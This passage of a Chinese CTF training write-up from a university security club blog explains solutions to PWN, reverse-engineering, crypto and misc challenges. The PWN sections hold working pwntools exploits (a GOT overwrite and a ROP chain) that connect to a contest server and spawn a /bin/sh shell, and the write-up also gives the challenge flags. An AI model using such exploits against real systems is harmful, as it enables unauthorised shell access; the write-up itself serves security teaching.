<h3 id="0x01-Command-2"><a href="#0x01-Command-2" class="headerlink" title="0x01.Command 2"></a>0x01.Command 2</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 121.41.113.245 10000</span><br></pre></td></tr></table></figure>

<p>​        这题和上题差不多，都是输入命令然后执行。</p>
<p><img src="https://s1.ax1x.com/2020/07/20/U4whTS.png" alt=""></p>
<p>​        不同的是，这次输入的命令长度限制为2字节。</p>
<p>​        我们可以想到用$0命令来重启终端，相当于执行了/bin/sh。</p>
<p><img src="https://s1.ax1x.com/2020/07/20/U4wWef.png" alt=""></p>
<p>​        <a href="https://blog.csdn.net/helloxiaozhe/article/details/80940066" target="_blank" rel="noopener">参考博客</a>。</p>
<h3 id="0x02-pwntools"><a href="#0x02-pwntools" class="headerlink" title="0x02.pwntools"></a>0x02.pwntools</h3><p><img src="https://img-blog.csdnimg.cn/20200719180752219.png" alt="在这里插入图片描述"><br>        nc之后说flag藏在了里面，下pwntools即可拿到flag，想到了pwntools的recv可以显示出被\r隐藏的句子</p>
<p><img src="https://img-blog.csdnimg.cn/20200719181608918.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTg4MzIyMw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>        把\n和\r之间的字符串base64解码即可。</p>
<h3 id="0x03-miss-some"><a href="#0x03-miss-some" class="headerlink" title="0x03.miss_some"></a>0x03.miss_some</h3><p><img src="https://s1.ax1x.com/2020/07/20/U4wIYQ.png" alt=""></p>
<p>​        让我们输入想要的。。。不知所云。</p>
<p>​        丢ida瞅瞅：</p>
<p><img src="https://s1.ax1x.com/2020/07/20/U4woWj.png" alt=""></p>
<p>​        主函数有俩scanf，一个有&amp;，一个没有。也就是说，我们第一次输入值，会被当成下一次输入的目标地址。比如说第一次输入0x08048052这个地址，那buf变量就保存了这个地址，第二次输入的时候，由于没有&amp;，所以scanf就会把v4变量里的值当成地址，进而让用户对0x08048052地址进行输入。</p>
<p>​        除此之外我们还注意到，程序中运用到了system函数，而且两个scanf函数之后，发现puts(“/bin/sh”);的代码。这里我们只要将puts的函数地址，改写成system的函数地址，那么系统在执行puts(“/bin/sh”);的时候就会执行system(“/bin/sh”);</p>
<p>​        要了解如何修改函数调用地址，需要了解<a href="https://blog.csdn.net/mylyylmy/article/details/79954581" target="_blank" rel="noopener">got表以及got表的覆写技术</a>。这里只大致解释一下：ELF文件中，用一个表，got(全局偏移表)表，来记录整个程序用到的全局函数名(标识符)及其地址。当程序需要调用函数的时候，就去got表搜这个函数的地址。每个函数第一次被调用时，系统还会将got表重定向到plt表(过程连接表)中，使其根据函数一一对应。所以最终调用的还是plt表里的地址。</p>
<p>​        因此我们只要向puts的got表中写入system在plt表中的值，即可拿flag。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = remote(<span class="string">"121.41.113.245"</span>,<span class="number">10002</span>)</span><br><span class="line">elf = ELF(<span class="string">"./miss_some"</span>)</span><br><span class="line">puts_addr = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">system_addr = elf.plt[<span class="string">'system'</span>]</span><br><span class="line">p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">p.sendline(str(puts_addr))		<span class="comment">#因为scanf中限定的格式化字符串为“%d”，因此我们只能输入十进制数	</span></span><br><span class="line">p.sendline(str(system_addr))	<span class="comment">#str()会将十进制的地址转成字符串输出，和终端的输入效果相同</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> str(puts_addr)</span><br><span class="line"><span class="keyword">print</span> str(puts_addr)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://s1.ax1x.com/2020/07/20/U4wHln.png" alt=""></p>
<h3 id="0x04-ROP"><a href="#0x04-ROP" class="headerlink" title="0x04.ROP"></a>0x04.ROP</h3><p>​        rop老套路了。</p>
<p><img src="https://img-blog.csdnimg.cn/20200719191002377.png" alt=""><br>        IDA中shift+F12</p>
<p><img src="https://img-blog.csdnimg.cn/20200719191930322.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTg4MzIyMw==,size_16,color_FFFFFF,t_70" alt=""><br>双击查看/bin/sh的地址</p>
<p><img src="https://img-blog.csdnimg.cn/2020071919195647.png" alt=""><br>双击查看system的地址</p>
<p><img src="https://img-blog.csdnimg.cn/20200719193036278.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTg4MzIyMw==,size_16,color_FFFFFF,t_70" alt=""><br>计算偏移量</p>
<p><img src="https://img-blog.csdnimg.cn/20200719193341909.png" alt=""><br><img src="https://img-blog.csdnimg.cn/20200719193401535.png" alt=""></p>
<p>0x4-(-0x38)=60</p>
<p>payload如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh = process('./rop')</span></span><br><span class="line">sh=remote(<span class="string">'121.41.113.245'</span>,<span class="number">10003</span>)</span><br><span class="line">binsh_addr = <span class="number">0x08049a20</span></span><br><span class="line">system_plt = <span class="number">0x080483D0</span></span><br><span class="line">payload = flat([<span class="string">'a'</span> * <span class="number">60</span>, system_plt, <span class="string">'b'</span> * <span class="number">4</span>, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>这里我们需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以’bbbb’ 作为虚假的地址，其后参数对应的参数内容。</p>
<p><img src="https://img-blog.csdnimg.cn/20200719193621879.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTg4MzIyMw==,size_16,color_FFFFFF,t_70" alt=""></p>
<h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="0x00-不会有人看不懂c吧"><a href="#0x00-不会有人看不懂c吧" class="headerlink" title="0x00 . 不会有人看不懂c吧"></a>0x00 . 不会有人看不懂c吧</h3><p>​        顾名思义，这是和c相关的逆向，可以直接扔进ida分析程序</p>
<p>​        程序逻辑也一目了然，简单来说就是，将你的输入与num数组中存在的位置异或，然后放到该位置，最后与程序中存在的数据进行比较，全部一样，则判定为正确的flag。</p>
<p>​        所以逆向脚本也很简单</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">a=[<span class="number">125</span>,<span class="number">94</span>,<span class="number">108</span>,<span class="number">48</span>,<span class="number">126</span>,</span><br><span class="line">    <span class="number">104</span>,<span class="number">114</span>,<span class="number">124</span>,<span class="number">41</span>,<span class="number">111</span>,</span><br><span class="line">    <span class="number">102</span>,<span class="number">62</span>,<span class="number">60</span>,<span class="number">82</span>,<span class="number">107</span>,</span><br><span class="line">    <span class="number">110</span>,<span class="number">98</span>,<span class="number">103</span>,<span class="number">119</span>,<span class="number">36</span>,</span><br><span class="line">    <span class="number">124</span>,<span class="number">116</span>,<span class="number">115</span>,<span class="number">112</span>,<span class="number">118</span>,</span><br><span class="line">    <span class="number">70</span>,<span class="number">127</span>,<span class="number">68</span>,<span class="number">110</span>]</span><br><span class="line">b=[<span class="number">9</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">23</span>,<span class="number">7</span>,</span><br><span class="line">    <span class="number">24</span>,<span class="number">12</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">16</span>,</span><br><span class="line">    <span class="number">3</span>,<span class="number">17</span>,<span class="number">14</span>,<span class="number">28</span>,<span class="number">11</span>,</span><br><span class="line">    <span class="number">18</span>,<span class="number">27</span>,<span class="number">22</span>,<span class="number">4</span>,<span class="number">13</span>,</span><br><span class="line">    <span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">2</span>,<span class="number">25</span>,</span><br><span class="line">    <span class="number">5</span>,<span class="number">26</span>,<span class="number">8</span>,<span class="number">0</span>]</span><br><span class="line">c=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">29</span>):</span><br><span class="line">	c+=chr(a[b[i]]^b[i])</span><br><span class="line">print(c)</span><br></pre></td></tr></table></figure>

<p>flag{n0t_r3ver5e_ez_7han_me!}</p>
<h3 id="0x01-没老师教，惨惨"><a href="#0x01-没老师教，惨惨" class="headerlink" title="0x01 . 没老师教，惨惨"></a>0x01 . 没老师教，惨惨</h3><p>​        其实题目名和提示都是表示，用来写出这个exe程序的代码是没老师教的</p>
<p>​        结合我们的日常使用以及分析程序，很容易想到是python代码</p>
<p>​        例如使用ida查看字符串，有大量py开头的字符</p>
<p>​        最常见的py打包方法是py2exe和pyinstaller，这里我使用的是pyinstaller</p>
<p>​        搜索如何反编译pyinstaller可得pyinstaller自带archive_viewer可以反编译</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PyInstaller.utils.cliutils.archive_viewer <span class="keyword">import</span> run</span><br><span class="line">run()</span><br></pre></td></tr></table></figure>

<p>​        这个脚本的可用命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">U: go Up one level</span><br><span class="line">O &lt;name&gt;: open embedded archive name</span><br><span class="line">X &lt;name&gt;: extract name</span><br><span class="line">Q: quit</span><br></pre></td></tr></table></figure>

<p><img src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/%E5%8D%8F%E4%BC%9A%E8%AE%AD%E7%BB%83%E8%B5%9B-3-1.png" alt=""></p>
<p>​        我们使用x test，来提取test文件，可以得到.pyc文件</p>
<p>​        但需要注意的是这个提取出来的pyc可能会缺少文件头，补上即可</p>
<p><img src="https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/%E5%8D%8F%E4%BC%9A%E8%AE%AD%E7%BB%83%E8%B5%9B-3-2.png" alt=""></p>
<p>​        再扔进反编译工具可得</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Str = <span class="string">''</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">Str += raw_input()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(Str)):</span><br><span class="line">    <span class="keyword">if</span> Str[i] <span class="keyword">in</span> (<span class="string">'x'</span>, <span class="string">'y'</span>, <span class="string">'z'</span>):</span><br><span class="line">        flag += chr(ord(Str[i]) - <span class="number">23</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += chr(ord(Str[i]) + <span class="number">3</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>

<p>​        容易看出是凯撒加密密码，但是还是没有flag，为什么呢</p>
<p>​        是因为出题人太菜了呜呜呜</p>
<p>​        以为python编译后是保留注释的，其实只保留‘’‘因为这算字符串’‘’，不保留#</p>
<p>​        也就是说没有了</p>
<p>​        # Str = zxeedoxeedgxegxe</p>
<p>​        最后的flag应该是 flag{wubbalubbadubdub}</p>
<p>​        咚咚咚，dbq大家</p>
<p><img src="https://s1.ax1x.com/2020/07/20/U4wxkF.gif" alt=""></p>
<h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="0x00-pig🐖"><a href="#0x00-pig🐖" class="headerlink" title="0x00 . pig🐖"></a>0x00 . pig🐖</h3><p>​        根据题目知道是<a href="https://www.cnblogs.com/Yuuki-/p/7897171.html" target="_blank" rel="noopener">猪圈密码</a>。</p>
<p>​        解出来是：eatalldaysleepallnight</p>
<h3 id="REPLACE"><a href="#REPLACE" class="headerlink" title="REPLACE"></a>REPLACE</h3><p>简单的替换密码（找规律）</p>
<p>明文的每个字母都对应密文里某个特定的字母</p>
<p>（最后少的两个随意组合一下就行）</p>
<h3 id="梨son对数"><a href="#梨son对数" class="headerlink" title="梨son对数"></a>梨son对数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">n = <span class="number">43241</span></span><br><span class="line">m = random.randint(<span class="number">2</span>, n<span class="number">-1</span>) | <span class="number">1</span></span><br><span class="line">c = pow(m, flag, n)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'m = '</span> + str(m)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'c = '</span> + str(c)</span><br><span class="line"><span class="comment"># m = 7</span></span><br><span class="line"><span class="comment"># c = 35246</span></span><br></pre></td></tr></table></figure>

<p>把网鼎杯的数据改小了，用在线网站工具<a href="https://www.alpertron.com.ar/DILOG.HTM" target="_blank" rel="noopener">离散对数计算器</a>即可求解</p>
<p><img src="https://img-blog.csdnimg.cn/20200719170641702.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTg4MzIyMw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>把3373md5加密即可</p>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="0x00-sounds"><a href="#0x00-sounds" class="headerlink" title="0x00 . sounds"></a>0x00 . sounds</h3><p>​        根据题目，猜出是个音频文件，改成.mp3后缀听一下，没啥信息。</p>
<p>​        丢进Audiecy：</p>
<p><img src="https://s1.ax1x.com/2020/07/20/U4wqO0.png" alt=""></p>
<p>​        查看频谱图：</p>
<p><img src="https://s1.ax1x.com/2020/07/20/U4wXwT.png" alt=""></p>
<p>​        得到flag。</p>
<h3 id="佬涩披"><a href="#佬涩披" class="headerlink" title="佬涩披"></a>佬涩披</h3><p>stegsolve方向键点几下就有了</p>

    </div>

    
    
    
        <div class="reward-container">
  <div>Donate comment here.</div>
  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
    Donate
  </button>
  <div id="qr" style="display: none;">

  </div>
</div>


      <footer class="post-footer">
          <div class="post-tags">
              
                 <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
              
                 <a href="/tags/Web/" rel="tag"><i class="fa fa-tag"></i> Web</a>
              
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2021/01/30/s1rone_wp/" rel="prev" title="WUST内部赛wp">
      <i class="fa fa-chevron-left"></i> WUST内部赛wp
    </a></div>
      <div class="post-nav-item">
    <a href="/2021/01/30/li_one/" rel="next" title="协会博客操作方法">
      协会博客操作方法 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  

  </div>


          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let activeClass = CONFIG.comments.activeClass;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Web"><span class="nav-number">1.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Login-as-admin"><span class="nav-number">1.1.</span> <span class="nav-text">Login as admin</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#大人，时代变了"><span class="nav-number">1.2.</span> <span class="nav-text">大人，时代变了</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x0-前言"><span class="nav-number">1.2.1.</span> <span class="nav-text">0x0 前言</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x1-前端审计"><span class="nav-number">1.2.2.</span> <span class="nav-text">0x1 前端审计</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#抓包"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">抓包</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#逻辑分析"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">逻辑分析</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#解密算法"><span class="nav-number">1.2.2.3.</span> <span class="nav-text">解密算法</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x2-验证码识别"><span class="nav-number">1.2.3.</span> <span class="nav-text">0x2 验证码识别</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#分析"><span class="nav-number">1.2.3.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#验证码处理"><span class="nav-number">1.2.3.2.</span> <span class="nav-text">验证码处理</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#特征提取"><span class="nav-number">1.2.3.3.</span> <span class="nav-text">特征提取</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x3-代理池"><span class="nav-number">1.2.4.</span> <span class="nav-text">0x3 代理池</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x4-全部代码"><span class="nav-number">1.2.5.</span> <span class="nav-text">0x4 全部代码</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#主体"><span class="nav-number">1.2.5.1.</span> <span class="nav-text">主体</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#特征点"><span class="nav-number">1.2.5.2.</span> <span class="nav-text">特征点</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x5-题目源码"><span class="nav-number">1.2.6.</span> <span class="nav-text">0x5 题目源码</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#前端"><span class="nav-number">1.2.6.1.</span> <span class="nav-text">前端</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#App-tsx"><span class="nav-number">1.2.6.1.1.</span> <span class="nav-text">App.tsx</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#Drawer-tsx"><span class="nav-number">1.2.6.1.2.</span> <span class="nav-text">Drawer.tsx</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#后端"><span class="nav-number">1.2.6.2.</span> <span class="nav-text">后端</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#views-py"><span class="nav-number">1.2.6.2.1.</span> <span class="nav-text">views.py</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#utils-py"><span class="nav-number">1.2.6.2.2.</span> <span class="nav-text">utils.py</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#models-py"><span class="nav-number">1.2.6.2.3.</span> <span class="nav-text">models.py</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#这个跳板怎么样"><span class="nav-number">1.3.</span> <span class="nav-text">这个跳板怎么样</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EasyWeb"><span class="nav-number">1.4.</span> <span class="nav-text">EasyWeb</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PWN"><span class="nav-number">2.</span> <span class="nav-text">PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-Command"><span class="nav-number">2.1.</span> <span class="nav-text">0x00.Command</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-Command-2"><span class="nav-number">2.2.</span> <span class="nav-text">0x01.Command 2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-pwntools"><span class="nav-number">2.3.</span> <span class="nav-text">0x02.pwntools</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-miss-some"><span class="nav-number">2.4.</span> <span class="nav-text">0x03.miss_some</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-ROP"><span class="nav-number">2.5.</span> <span class="nav-text">0x04.ROP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RE"><span class="nav-number">3.</span> <span class="nav-text">RE</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-不会有人看不懂c吧"><span class="nav-number">3.1.</span> <span class="nav-text">0x00 . 不会有人看不懂c吧</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-没老师教，惨惨"><span class="nav-number">3.2.</span> <span class="nav-text">0x01 . 没老师教，惨惨</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CRYPTO"><span class="nav-number">4.</span> <span class="nav-text">CRYPTO</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-pig🐖"><span class="nav-number">4.1.</span> <span class="nav-text">0x00 . pig🐖</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#REPLACE"><span class="nav-number">4.2.</span> <span class="nav-text">REPLACE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#梨son对数"><span class="nav-number">4.3.</span> <span class="nav-text">梨son对数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MISC"><span class="nav-number">5.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-sounds"><span class="nav-number">5.1.</span> <span class="nav-text">0x00 . sounds</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#佬涩披"><span class="nav-number">5.2.</span> <span class="nav-text">佬涩披</span></a></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="WUST-AIS"
      src="/uploads/logo.png">
  <p class="site-author-name" itemprop="name">WUST-AIS</p>
  <div class="site-description" itemprop="description">Join us</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">9</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">2</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">6</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/wust-ais" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;wust-ais" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:no-reply-wais@foxmail.com" title="E-Mail → mailto:no-reply-wais@foxmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">WUST-AIS</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.2.1
  </div>
  <span class="post-meta-divider">|</span>
  <div class="theme-info">Theme – <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.7.2
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

</body>
</html>
